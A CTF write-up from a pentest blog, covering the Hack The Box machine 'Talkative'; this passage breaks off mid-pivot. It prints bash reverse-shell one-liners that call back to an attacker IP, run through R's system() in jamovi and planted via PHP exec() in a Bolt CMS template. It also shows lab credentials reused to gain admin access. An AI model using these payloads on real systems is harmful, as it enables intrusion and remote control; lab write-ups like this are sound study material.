<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Talkative just retired on Hack The Box, it‚Äôs a Hard rated difficulty Linux box. The box solving heavily relied on pivot between application running in docker container, bringing a mix of network and">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Talkative">
<meta property="og:url" content="https://hg8.sh/posts/talkative/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes ‚Äî My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Talkative just retired on Hack The Box, it‚Äôs a Hard rated difficulty Linux box. The box solving heavily relied on pivot between application running in docker container, bringing a mix of network and">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164916795-5c33ab53-424b-4846-9bff-7b4c19ca529d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164981075-84d9cb80-1d5e-4d2c-ac7a-90255f25393b.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164981863-eb9c7f8c-ad33-4c4a-b2d4-bb4c8a01202f.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164987197-2a90c327-49d0-4726-9dad-9b04ad36cda6.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/165098988-b93a12a4-07a2-4c12-ba90-3ef8253db870.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/165103605-a827aa1a-9d98-403b-8e80-40eee285fb92.png">
<meta property="article:published_time" content="2022-08-26T22:00:00.000Z">
<meta property="article:modified_time" content="2022-09-03T15:15:49.884Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="docker">
<meta property="article:tag" content="mongodb">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="container">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="recon">
<meta property="article:tag" content="jamovi">
<meta property="article:tag" content="rocket.chat">
<meta property="article:tag" content="pwncat">
<meta property="article:tag" content="bolt">
<meta property="article:tag" content="cap-dac-read-search">
<meta property="article:tag" content="shocker">
<meta property="article:tag" content="webhook">
<meta property="article:tag" content="twig">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="r-lang">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/164916795-5c33ab53-424b-4846-9bff-7b4c19ca529d.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Talkative :: hg8&#39;s Notes ‚Äî My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes ‚Äî My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/binary-exploitation/buffer-overflow-introduction/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/bugbounty/ssrf-to-rce-aws/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-on-jamovi-Rj-Editor"><span class="toc-number">1.2.</span> <span class="toc-text">RCE on jamovi Rj Editor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-jamovi-%E2%86%92-Bolt"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot jamovi ‚Üí Bolt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-Bolt-%E2%86%92-Saul-user"><span class="toc-number">1.4.</span> <span class="toc-text">Pivot Bolt ‚Üí Saul user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-saul-%E2%86%92-Rocket-chat"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot saul ‚Üí Rocket.chat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-file-read-%E2%86%92-Root-Shell"><span class="toc-number">2.3.</span> <span class="toc-text">Arbitrary file read ‚Üí Root Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Talkative
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2022-08-26T22:00:00.000Z" itemprop="datePublished">27-08-2022</time>
        
      
    </div>


      ‚Äî Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      ‚Äî
      18 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="https://user-images.githubusercontent.com/9076747/164916795-5c33ab53-424b-4846-9bff-7b4c19ca529d.png" alt="https://user-images.githubusercontent.com/9076747/164916795-5c33ab53-424b-4846-9bff-7b4c19ca529d.png"></p>
<p>Talkative just retired on Hack The Box, it‚Äôs a Hard rated difficulty Linux box. The box solving heavily relied on pivot between application running in docker container, bringing a mix of network and environnement discovery as well as classical exploitation of weakly secured web application. All in all it‚Äôs a very good to get more familiar with network and application pivot in containerized environment providing to no usual OS dependency needed for usual recon, pivot and exploitation.<br>I recommend this box to learn more about container exploitation and it‚Äôs great opportunity to learn about new pen-testing tools.</p>
<p><strong>Tl;Dr:</strong> In order to get the user flag the first step was to get a shell on the first container after exploiting a command injection vulnerability in a data visualisation application. With this shell you could retrieve admin credentials for user <code>saul</code> of a Bolt Instance CMS allowing you to pivot to the Bolt container by uploading a PHP shell from the Admin console file editor function. On the container you can write a network discovery script to find a machine with port 22 open, re-using <code>saul</code> password we found earlier on the machine allows us to access the server and grab the user flag.<br>In order to retrieve the root flag you had to connect to the non-secured MongoDB instance running on the server to reset the admin account password of a <code>[Rocket.chat](http://Rocket.chat)</code> application. Once Admin on the application you can exploit a vulnerability to get a shell on its container. This last container have the <code>CAP_DAC_READ_SEARCH</code> capabilities set, allowing the container to read file from host. Exploiting this vulnerability allows us to read the <code>/root/root.txt</code> flag.</p>
<p>Alright! Let‚Äôs get into the details now!</p>
<hr>
<p>First thing first, let‚Äôs add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.227.113 talkative.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>And let‚Äôs start!</p>
<h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let‚Äôs start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC talkative.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> talkative.htb (<span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>     http    Apache httpd <span class="number">2.4</span><span class="number">.52</span></span><br><span class="line">|_http-generator: Bolt</span><br><span class="line">|_http-title: Talkative.htb | Talkative</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span><span class="number">.52</span> (Debian)</span><br><span class="line"><span class="number">3000</span>/tcp <span class="built_in">open</span>     ppp?</span><br><span class="line">|_    HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line"><span class="number">8080</span>/tcp <span class="built_in">open</span>     http    Tornado httpd <span class="number">5.0</span></span><br><span class="line">|_http-title: jamovi</span><br><span class="line">|_http-server-header: TornadoServer/<span class="number">5.0</span></span><br><span class="line"><span class="number">8081</span>/tcp <span class="built_in">open</span>     http    Tornado httpd <span class="number">5.0</span></span><br><span class="line">|_http-title: <span class="number">404</span>: Not Found</span><br><span class="line">|_http-server-header: TornadoServer/<span class="number">5.0</span></span><br><span class="line"><span class="number">8082</span>/tcp <span class="built_in">open</span>     http    Tornado httpd <span class="number">5.0</span></span><br><span class="line">|_http-title: <span class="number">404</span>: Not Found</span><br><span class="line">|_http-server-header: TornadoServer/<span class="number">5.0</span></span><br></pre></td></tr></table></figure>

<p>Aside from the usual SSH port we have:</p>
<ul>
<li>A <code>Bolt CMS</code> landing page running on port <code>8080</code>, looks like a simple landing presenting the project. Some information about the team‚Äôs member usernames and app running might be useful to save.</li>
<li>A <code>jamovi</code> instance running on port <code>8080</code>. Jamovi an open-source software for statistical analysis. We can note that no authentication is required to access all the functionalities.</li>
<li>An authentication page for <code>Rocket.Chat</code> application on port <code>3000</code>. <code>Rocket.Chat</code> is an open-source group chat application.</li>
<li>Port <code>8081</code> and <code>8082</code> both returns <code>404</code>.</li>
</ul>
<p>The initial footstep took me a while to figure out, after a bunch of fuzzing and trying to find hidden endpoints with no success I decided to focus on the <code>jamovi</code> instance running with no authentication, especially since the homepage explains:</p>
<blockquote>
<p>Hi<br>We found a security issue with this version of jamovi, and out of an abundance of caution, we recommend that you update to a newer version when you can.<br>You can continue to use this version of jamovi, but we‚Äôd advise you not to open data files from sources you do not trust until you update to a newer version. Sorry for the inconvenience.<br>Update to the latest version today.<br>‚Äì the jamovi team</p>
</blockquote>
<p>In the ‚ÄúOpen‚Äù menu we see an interesting entry stored in the root folder: <code>bolt-administration.omv</code>. This is very probably data from the Bolt CMS application running on port <code>80</code> and might contains sensitive information.<br><code>.omv</code> seems to be a jamovi export data file format, which turn to be a simple zip file.<br>Unfortunately we can‚Äôt open the file directly in <code>jamovi</code> since the running version is incompatible with the file. Let‚Äôs find another way to get it.</p>
<p>I couldn‚Äôt find any useful public CVE or exploit on <code>jamovi</code>, however while researching the documentation of <code>jamovi</code>, I stumble upon this interesting article:</p>
<blockquote>
<p><strong>about arbitrary code</strong><br>Some analyses in jamovi can be created using R code with the Rj Editor. This allows for great flexibility in what analyses can be run, however due to the flexibility of R code, it‚Äôs possible for someone to write an analysis which does malicious things, such as deleting files. This is a similar situation to other software which allows arbitrary code, such as macros in Microsoft Word or Excel.<br><a target="_blank" rel="noopener" href="https://www.jamovi.org/about-arbitrary-code.html">https://www.jamovi.org/about-arbitrary-code.html</a></p>
</blockquote>
<p>Well that‚Äôs interesting, especially since the <code>Rj Editor</code> is available on our instance. Being not familiar with R language I checked the documentation and learned why <code>jamovi</code> was warning about arbitrary code execution.<br>R Language have a function to Invoke a System command:</p>
<blockquote>
<p><strong>Description</strong><br>system invokes the OS command specified by command.<br><strong>Usage</strong><br>system(command, intern = FALSE, ignore.stdout = FALSE, ignore.stderr = FALSE, wait = TRUE, input = NULL, show.output.on.console = TRUE, minimized = FALSE, invisible = TRUE, timeout = 0)<br><a target="_blank" rel="noopener" href="https://stat.ethz.ch/R-manual/R-devel/library/base/html/system.html">https://stat.ethz.ch/R-manual/R-devel/library/base/html/system.html</a></p>
</blockquote>
<p>Let‚Äôs see what happen when we try to run a reverse shell.</p>
<h3 id="RCE-on-jamovi-Rj-Editor"><a href="#RCE-on-jamovi-Rj-Editor" class="headerlink" title="RCE on jamovi Rj Editor"></a>RCE on jamovi Rj Editor</h3><p>First, as usual, let‚Äôs open our <code>nc</code> listener:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p <span class="number">8585</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8585</span></span><br></pre></td></tr></table></figure>

<p>And input a Bash reverse shell into <code>Rj Editor</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.19/8585 0&gt;&amp;1&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/164981075-84d9cb80-1d5e-4d2c-ac7a-90255f25393b.png" alt="https://user-images.githubusercontent.com/9076747/164981075-84d9cb80-1d5e-4d2c-ac7a-90255f25393b.png"></p>
<p>We get a warning about execution of arbitrary code, clicking ‚ÄúEnable‚Äù allows the execution of the reverse shell:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p <span class="number">8585</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8585</span></span><br><span class="line">Connection received on talkative.htb <span class="number">35446</span></span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@b06821bbda78:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>We can immediately see that we are running in a Docker container:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@b06821bbda78:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line"><span class="number">12</span>:cpuset:/docker/b06821bbda786b9790c5d7efd202f1d43534dd343f781bcd414aa06a447b7cf6</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-jamovi-‚Üí-Bolt"><a href="#Pivot-jamovi-‚Üí-Bolt" class="headerlink" title="Pivot jamovi ‚Üí Bolt"></a>Pivot jamovi ‚Üí Bolt</h3><p>Before trying any crazy exploit of container escape let‚Äôs see what‚Äôs inside this <code>bolt-administration.omv</code> file we found earlier.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@b06821bbda78:/<span class="comment"># l /root</span></span><br><span class="line">Documents/  bolt-administration.omv</span><br><span class="line">root@b06821bbda78:/<span class="comment"># file /root/bolt-administration.omv</span></span><br><span class="line">/root/bolt-administration.omv: Zip archive data, at least v2<span class="number">.0</span> to extract</span><br></pre></td></tr></table></figure>

<p>We can download the file on our machine using <code>nc</code> it to analyze its content:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -lvp <span class="number">4444</span> &lt; bolt-administration.omv</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@b06821bbda78:/<span class="comment"># nc 10.10.14.19 4444 &gt; /root/bolt-administration.omv</span></span><br><span class="line">bash: nc: command <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<p>Bummer, <code>nc</code> is not available.</p>
<p>In that case the easiest way to download the file is to use an <code>netcat</code> wrapper. I will use <code>[pwncat-](https://github.com/calebstewart/pwncat)cs</code>.<br>We need to restart our reverse by using the <code>pwncat</code> listener:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ pwncat-cs -lp <span class="number">8585</span></span><br><span class="line">[<span class="number">14</span>:03:07] Welcome to pwncat üêà!                                                                                                                                                                    __main__.py:<span class="number">164</span></span><br><span class="line">[<span class="number">14</span>:03:<span class="number">13</span>] received connection <span class="keyword">from</span> <span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>:<span class="number">37746</span>                                                                                                                                                 bind.py:<span class="number">84</span></span><br><span class="line">[<span class="number">14</span>:03:<span class="number">14</span>] <span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>:<span class="number">37746</span>: registered new host w/ db                                                                                                                                           manager.py:<span class="number">957</span></span><br><span class="line">(local) pwncat$ <span class="comment"># Ctrl + d to switch to remote host</span></span><br><span class="line">(remote) root@b06821bbda78:/<span class="comment"># ls /root/</span></span><br><span class="line">Documents  bolt-administration.omv</span><br><span class="line">(remote) root@b06821bbda78:/<span class="comment"># # Ctrl + d to switch to local host</span></span><br><span class="line">(local) pwncat$ download /root/bolt-administration.omv .</span><br><span class="line">/root/bolt-administration.omv ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ <span class="number">0.0</span>% ‚Ä¢ <span class="number">0</span>/<span class="number">0</span> <span class="built_in">bytes</span> ‚Ä¢ ? ‚Ä¢ -:--:--</span><br><span class="line">[<span class="number">14</span>:<span class="number">25</span>:<span class="number">40</span>] downloaded <span class="number">2.19</span>KiB <span class="keyword">in</span> <span class="number">0.25</span> seconds</span><br></pre></td></tr></table></figure>

<p>Let‚Äôs now unzip it and take a look at its content:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ unzip bolt-administration.omv</span><br><span class="line">Archive:  bolt-administration.omv</span><br><span class="line">  inflating: META-INF/MANIFEST.MF</span><br><span class="line">  inflating: meta</span><br><span class="line">  inflating: index.html</span><br><span class="line">  inflating: metadata.json</span><br><span class="line">  inflating: xdata.json</span><br><span class="line">  inflating: data.<span class="built_in">bin</span></span><br><span class="line">  inflating: 01 empty/analysis</span><br></pre></td></tr></table></figure>

<p>The <code>xdata.json</code> file looks promising:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ jq . xdata.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;A&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: [</span><br><span class="line">      [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;matt@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;matt@talkative.htb&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;janit@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;janit@talkative.htb&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="string">&quot;saul@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;saul@talkative.htb&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ]</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;B&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: [</span><br><span class="line">      [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;jeO09ufhWD&lt;s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jeO09ufhWD&lt;s&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;bZ89h&#125;V&lt;S_DA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bZ89h&#125;V&lt;S_DA&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="string">&quot;)SQWGm&gt;9KHEA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;)SQWGm&gt;9KHEA&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ]</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;C&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We got passwords for several accounts. We can try them on the <code>Bolt CMS</code> admin page running on <a target="_blank" rel="noopener" href="http://talkative.htb/bolt"><code>http://talkative.htb/bolt</code></a>. None of them seems to works until we try with Bolt CMS default admin username (<code>admin</code>) with the password of <code>saul</code> (<code>jeO09ufhWD&lt;s</code>):</p>
<p><img src="https://user-images.githubusercontent.com/9076747/164981863-eb9c7f8c-ad33-4c4a-b2d4-bb4c8a01202f.png" alt="https://user-images.githubusercontent.com/9076747/164981863-eb9c7f8c-ad33-4c4a-b2d4-bb4c8a01202f.png"></p>
<p>Thanks to the file editor accessible on the administration panel, we can easily edit any PHP file to upload reverse shell:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.19/8585 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/164987197-2a90c327-49d0-4726-9dad-9b04ad36cda6.png" alt="https://user-images.githubusercontent.com/9076747/164987197-2a90c327-49d0-4726-9dad-9b04ad36cda6.png"></p>
<p>Reloading the page makes our listener to receive a connection:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p <span class="number">8585</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8585</span></span><br><span class="line">Connection received on talkative.htb <span class="number">38904</span></span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@46c004bb2269:/var/www/talkative.htb/bolt/public$</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-Bolt-‚Üí-Saul-user"><a href="#Pivot-Bolt-‚Üí-Saul-user" class="headerlink" title="Pivot Bolt ‚Üí Saul user"></a>Pivot Bolt ‚Üí Saul user</h3><p>Once again we land on a new Docker container. This time recon doesn‚Äôt yield anything interesting at all. The recon part is more difficult than usual because most of common tools are not present on the container (<code>ping</code>, <code>curl</code>, <code>wget</code>, <code>nc</code>, <code>nmap</code>‚Ä¶)</p>
<p>After being stuck with no results for way too long I decide to create poor man host discovery script to see if any host accessible from our container have their port SSH (22) open:</p>
